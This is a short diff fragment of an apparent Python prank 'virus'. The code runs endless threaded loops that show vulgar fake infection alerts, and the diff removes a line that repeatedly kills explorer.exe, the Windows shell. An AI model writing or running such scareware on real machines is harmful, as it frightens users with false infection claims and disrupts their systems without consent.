@@ -36,7 +36,6 @@ def loop2():
 def loop3():
     while True:
         tkinter.messagebox.showerror(title="ТОБI ПIЗДА", message="ВАШ ЭВМ ЗАРАЖЁН ГАЧИ-ВИРУСОМ")
-        os.system("taskkill /im explorer.exe")
  
 Thread(target=loop1).start()
 Thread(target=loop2).start()
